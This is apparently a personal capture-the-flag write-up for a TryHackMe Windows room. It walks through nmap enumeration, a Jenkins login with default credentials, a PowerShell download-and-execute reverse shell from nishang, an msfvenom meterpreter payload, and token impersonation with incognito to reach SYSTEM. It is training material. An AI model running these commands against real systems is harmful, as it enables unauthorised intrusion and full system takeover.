# what I learn
- Jenkins
- windows access tokens
- abusing users privilege
- incognito

# to read
- https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens
- https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
- https://youtu.be/LFDrDnKPOTg

# enumerate
ports:
- 80/tcp   open  http
- 3389/tcp open  ms-wbt-server
- 8080/tcp open  http-proxy

```
PORT     STATE    SERVICE       VERSION
80/tcp   open     http          Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp filtered ms-wbt-server
8080/tcp open     http          Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   58.35 ms 10.8.0.1
2   58.66 ms 10.10.41.83

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
```
after some enumerating:
- port 80: **http**
  - only index.html
  - alfred@wayneenterprises.com
- port 8080: **Jenkins!**
  - admin:admin

# foothold
now when we in Jenkins (what is [Jenkins](https://youtu.be/LFDrDnKPOTg)), the plan is create a new Project and use created project to execute a powershell to get our reverse shell. Now let get our revershell.ps from a OP github project call [nishang](https://github.com/samratashok/nishang)

```console
kali@kali:~/THM/alfred$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
--2020-07-22 17:07:38--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.192.133, 151.101.128.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4339 (4.2K) [text/plain]
Saving to: ‘Invoke-PowerShellTcp.ps1’

Invoke-PowerShellTcp.ps1 100%[=================================>]   4.24K  --.-KB/s    in 0s      

2020-07-22 17:07:38 (39.2 MB/s) - ‘Invoke-PowerShellTcp.ps1’ saved [4339/4339]
kali@kali:~/THM/alfred$ python -m SimpleHTTPServer 8888 # set up the server
```
now we gonna get Jenkins to fetch our reverse shell from our server and execute it. Go to Jenkis dashboad and follow this step (read more [here](https://stackoverflow.com/questions/21276351/how-can-i-execute-shell-script-in-jenkinsfile)):
1. Click on `New Item` (left panel)
2. Give it a name + select `freestyle project` -> next
3. Go to `Build Enviroment` and insert this following:
```
powershell IEX (New-Object Net.WebClient).DownloadString('http://<ip>:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port 6969
```
4. On kali, open netcat and listen for incoming shell
5. Back to Jenkin where we left, press `apply` + `save`
visite alfred.thm:8080/job/kurohat/build or press `build now` to build our project. *user flag* can be found in Desktop:

## switching to msfconsole shell
```console
kali@kali:~/THM/alfred$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<ip> LPORT=9696 -f exe -o shell.exe #create shell
kali@kali:~/THM/alfred$ python -m SimpleHTTPServer 8888
```

use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.8.14.151 set LPORT 9696  run

```
msf5 exploit(multi/http/struts2_content_type_ognl) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set LHOST tun0
LHOST => 10.8.14.151
msf5 exploit(multi/handler) > set LPORT 9696
LPORT => 9696
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```

```cmd
PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.14.151:8888/shell.exe','shell.exe')"
PS C:\Users\bruce\Desktop> ./shell.exe
```


# root
Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:
- user SIDs(security identifier)
- group SIDs
- privileges

There are two types of access tokens:
- primary access tokens: those associated with a user account that are generated on log on
- impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:
- SecurityAnonymous: current user/client cannot impersonate another user/client
- SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
- SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
Here are the most commonly abused privileges:
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

all this is from the room.


now let check user service privilages
```console
meterpreter > load powershell # load poweshell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS> whoami /priv # check user service privilages

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```
Alfred have 2 enabled privilages that we can abuse:
1. SeImpersonatePrivilege
2. SeDebugPrivilege
Let's use the incognito module that will allow us to exploit this vulnerability. Enter: `load incognito` to load the incognito module in metasploit. read more about incognito [here](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)
```console
meterpreter > load incognito
meterpreter > list_tokens -g # list token 
meterpreter > impersonate_token "BUILTIN\Administrators" # copy token
meterpreter > ps # look for any NT AUTHORITY\SYSTEM priv process, best on is service.exe
meterpreter > migrate <PID>
meterpreter > powershell_shell 
PS > whoami
nt authority\system
```
now get root flag